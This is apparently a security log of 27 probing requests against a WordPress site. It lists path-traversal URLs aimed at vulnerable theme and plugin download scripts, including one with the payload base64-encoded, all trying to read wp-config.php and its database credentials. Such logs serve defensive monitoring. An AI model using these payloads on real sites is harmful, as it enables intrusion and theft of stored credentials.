Attempts: 1 - Request URL: bricksrus.com/wp-content/themes/awake/lib/scripts/dl-skin.php
Attempts: 2 - Request URL: www.bricksrus.com/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php
Attempts: 3 - Request URL: bricksrus.com/wp-content/themes/infocus2/lib/scripts/dl-skin.php
Attempts: 4 - Request URL: www.bricksrus.com/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php
Attempts: 5 - Request URL: www.bricksrus.com/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php
Attempts: 6 - Request URL: bricksrus.com/wp-content/themes/echelon/lib/scripts/dl-skin.php
Attempts: 7 - Request URL: www.bricksrus.com/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
Attempts: 8 - Request URL: www.bricksrus.com/wp-content/plugins/robotcpa/f.php?l=cGhwOi8vZmlsdGVyL3Jlc291cmNlPS4vLi4vLi4vLi4vd3AtY29uZmlnLnBocA==
Attempts: 9 - Request URL: www.bricksrus.com/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php
Attempts: 10 - Request URL: www.bricksrus.com/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php
Attempts: 11 - Request URL: bricksrus.com/wp-content/themes/myriad/lib/scripts/dl-skin.php
Attempts: 12 - Request URL: www.bricksrus.com/wp-content/plugins/wp-filemanager/incl/libfile.php?path=../../&filename=wp-config.php&action=download
Attempts: 13 - Request URL: bricksrus.com/wp-content/themes/construct/lib/scripts/dl-skin.php
Attempts: 14 - Request URL: bricksrus.com/wp-content/themes/fusion/lib/scripts/dl-skin.php
Attempts: 15 - Request URL: bricksrus.com/wp-content/themes/infocus/lib/scripts/dl-skin.php
Attempts: 16 - Request URL: www.bricksrus.com/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=../../../../wp-config.php
Attempts: 17 - Request URL: www.bricksrus.com/wp-content/plugins/image-export/download.php?file=../../../wp-config.php
Attempts: 18 - Request URL: www.bricksrus.com/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php
Attempts: 19 - Request URL: www.bricksrus.com/wp-content/themes/lote27/download.php?download=../../../wp-config.php
Attempts: 20 - Request URL: bricksrus.com/wp-content/themes/dejavu/lib/scripts/dl-skin.php
Attempts: 21 - Request URL: bricksrus.com/wp-content/plugins/really-simple-guest-post/simple-guest-post-submit.php
Attempts: 22 - Request URL: bricksrus.com/wp-content/themes/elegance/lib/scripts/dl-skin.php
Attempts: 23 - Request URL: bricksrus.com/wp-content/themes/method/lib/scripts/dl-skin.php
Attempts: 24 - Request URL: www.bricksrus.com/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php
Attempts: 25 - Request URL: www.bricksrus.com/wp-content/themes/estrutura-basica/scripts/download.php?arquivo=../../wp-config.php
Attempts: 26 - Request URL: www.bricksrus.com/wp-content/plugins/document_manager/views/file_download.php?fname=../../wp-config.php
Attempts: 27 - Request URL: www.bricksrus.com/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=../../../wp-config.php
